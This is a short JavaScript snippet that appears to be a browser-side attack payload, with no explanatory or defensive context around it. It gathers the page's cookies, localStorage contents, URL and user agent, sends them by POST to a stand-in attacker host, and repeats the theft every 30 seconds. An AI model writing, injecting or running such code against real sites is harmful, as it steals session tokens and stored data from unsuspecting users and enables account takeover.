// Exfiltrate cookies and localStorage to attacker's server
const exfiltrate = () => {
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    origin: window.location.href,
    userAgent: navigator.userAgent
  };
  
  fetch('https://attacker-server.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data),
    mode: 'no-cors'
  });
};

// Execute immediately + every 30 seconds (persistent theft)
exfiltrate();
setInterval(exfiltrate, 30000);
